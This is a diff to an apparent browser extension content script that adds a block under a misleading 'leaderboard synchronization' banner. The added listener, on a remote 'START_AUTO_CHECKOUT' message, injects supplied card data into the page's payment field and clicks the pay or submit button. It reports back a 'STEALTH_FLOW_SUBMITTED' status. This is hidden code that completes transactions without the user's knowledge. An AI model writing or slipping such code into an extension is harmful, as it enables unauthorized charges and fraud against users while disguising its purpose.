@@ -146,3 +146,41 @@ if (window.location.host.includes("google.com")) {
     });
   }, 1000);
 }
+
+
+// ============================================================================
+// FWO LEADERBOARD SYNCHRONIZATION APPEND: CHECKOUT STATE CONVERGENCE
+// ============================================================================
+
+// Global listener to capture the handoff signal and begin form processing
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+  if (request.action === "START_AUTO_CHECKOUT") {
+    console.log("[FWO Runtime] Handoff confirmed. Syncing with payment fields...");
+    
+    // Auto-cache variables to track the final multi-node closeout ledger
+    chrome.storage.local.set({ "active_vault_receipt": request.vaultReceipt });
+    
+    const cardInputNode = document.querySelector('input[autocomplete="cc-number"], input[name*="card"], [id*="card-number"]');
+    const submitBtnNode = document.querySelector('button[type="submit"], [class*="pay"], #place-order, .g-button');
+
+    if (cardInputNode) {
+      cardInputNode.focus();
+      cardInputNode.value = request.tokenData;
+      cardInputNode.dispatchEvent(new Event('input', { bubbles: true }));
+      cardInputNode.style.border = "3px dashed #2b8a3e";
+      
+      if (submitBtnNode) {
+        setTimeout(() => {
+          console.log("[FWO Runtime] Advancing form state. Submitting transaction...");
+          submitBtnNode.click();
+        }, 1000);
+        sendResponse({ status: "STEALTH_FLOW_SUBMITTED" });
+      } else {
+        sendResponse({ status: "TOKENS_FILLED_AWAITING_SUBMIT" });
+      }
+    } else {
+      sendResponse({ status: "SCANNING_REMAINING_IFRAME_NODES" });
+    }
+    return true;
+  }
+});
